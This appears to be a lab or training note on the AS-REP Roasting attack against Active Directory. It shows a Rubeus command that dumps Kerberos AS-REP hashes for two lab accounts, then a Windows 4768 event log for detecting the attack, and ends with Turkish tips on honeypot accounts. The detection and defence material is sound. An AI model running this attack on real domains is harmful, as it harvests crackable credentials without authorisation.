# AS-REP Roasting

## Performing the Attack

```pwsh
PS C:\Users\bob> .\Rubeus.exe asreproast /nowrap
```

```output title="Output" hl_lines="8 17"
[*] SamAccountName         : anni
[*] DistinguishedName      : CN=anni,OU=EagleUsers,DC=eagle,DC=local
[*] Using domain controller: DC1.eagle.local (172.16.18.3)
[*] Building AS-REQ (w/o preauth) for: 'eagle.local\anni'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$anni@eagle.local:475C1FB9806F806FCE109786FD839B38$EDCA35E53E22B380BE44A7D0128F59CA45E913C573A89B0871DAA533A047B6E72CCC9750545AE46B0EFB33D6D3FE38E07B9836922D3E91FC54D26C761C7EB5F5623E138B2AC9A1840DDF96B16971B447B9E82C1FF2A1481AEBDED475525D48F648CC8CCC32F1316C7C28449653EED95EC5E926FE9B8B3059264AB3FC77AB751FE0A9FE3726E14C4D6A6F71AF01913AC60C4A2B93A637B4EE5A00FAA06BE02E3216F78B528541C42A9F68B38087FA30B55BD5DCC30433A70943D117D4DFD3C7C93FA07C893E8A7DEA3EE0E968D670DC8F92F399AF16BFE8EE6DFC79A673BE71DE5FFC806F272F9FFA6860

[*] SamAccountName         : svc-iam
[*] DistinguishedName      : CN=svciam,OU=Detections,OU=EagleUsers,DC=eagle,DC=local
[*] Using domain controller: DC1.eagle.local (172.16.18.3)
[*] Building AS-REQ (w/o preauth) for: 'eagle.local\svc-iam'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$svc-iam@eagle.local:A1C0595240473F4ACA68AA7FEFE7E3D9$7703E6EFC624CC61AD02A011D0CDF09191D887AC8079BBE4F30D639F972375A7E449531D646D961D71A46310F16183D57DFFF6D9A60DE90C050C35740EC6A47F30D5F51E0C25F6CCC3EA12F672A4C06FFD45B933ADA9256DDF08737B713C3AC8CD86EDED19540708A9898D95D8D04FEE23C7D8483599E69377BE93F3807772F717D93F786470758069BCDCE7506B6E4627CD2890228F1B7018AA33A12CC34132A9D942CB359886F321DBAA68768F8D430791084E6712E0515341AF3416AE227755F9FC82F4960A2CEF6C557F84875F66000FB7298B0C1F3334A04F5655F4418858CCF30E50FD780EE172
```

## Event Viewer ([4768](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768))

```xml title="Details" hl_lines="4 19 26 28"
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
  <EventID>4768</EventID>
  <Version>0</Version>
  <Level>0</Level>
  <Task>14339</Task>
  <Opcode>0</Opcode>
  <Keywords>0x8020000000000000</Keywords>
  <TimeCreated SystemTime="2025-10-20T19:36:32.903363600Z" />
  <EventRecordID>556032</EventRecordID>
  <Correlation />
  <Execution ProcessID="680" ThreadID="4052" />
  <Channel>Security</Channel>
  <Computer>DC1.eagle.local</Computer>
  <Security />
  </System>
- <EventData>
  <Data Name="TargetUserName">svc-iam</Data>
  <Data Name="TargetDomainName">eagle.local</Data>
  <Data Name="TargetSid">S-1-5-21-1518138621-4282902758-752445584-3103</Data>
  <Data Name="ServiceName">krbtgt</Data>
  <Data Name="ServiceSid">S-1-5-21-1518138621-4282902758-752445584-502</Data>
  <Data Name="TicketOptions">0x40800010</Data>
  <Data Name="Status">0x0</Data>
  <Data Name="TicketEncryptionType">0x17</Data>
  <Data Name="PreAuthType">0</Data>
  <Data Name="IpAddress">::ffff:172.16.18.25</Data>
  <Data Name="IpPort">50135</Data>
  <Data Name="CertIssuerName" />
  <Data Name="CertSerialNumber" />
  <Data Name="CertThumbprint" />
  </EventData>
  </Event>
```

## Honeypot

* Honeypot hesabı görece eski bir hesap olmalı.
* Honeypot hesabı için yakın zamanda yapılan bir parola değişikliği olmamalı.
* Honeypot hesabı ilgi çekici ayrıcalıklara sahip olmalı.
